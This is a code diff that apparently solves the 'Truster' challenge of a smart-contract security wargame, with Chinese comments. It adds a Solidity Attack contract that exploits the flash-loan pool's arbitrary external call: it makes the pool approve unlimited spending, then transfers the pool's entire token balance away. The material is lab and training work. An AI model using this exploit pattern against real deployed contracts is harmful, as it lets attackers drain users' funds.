@@ -6,6 +6,17 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract Attack {
+    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
+        // 1. 让 pool approve 这个合约
+        pool.flashLoan(0, address(this), address(token),
+            abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max));
+
+        // 2. 从 pool 转走所有 token 到 recovery
+        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -51,7 +62,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // player 部署攻击合约，在构造函数中执行所有攻击逻辑
+        new Attack(token, pool, recovery);
     }
 
     /**
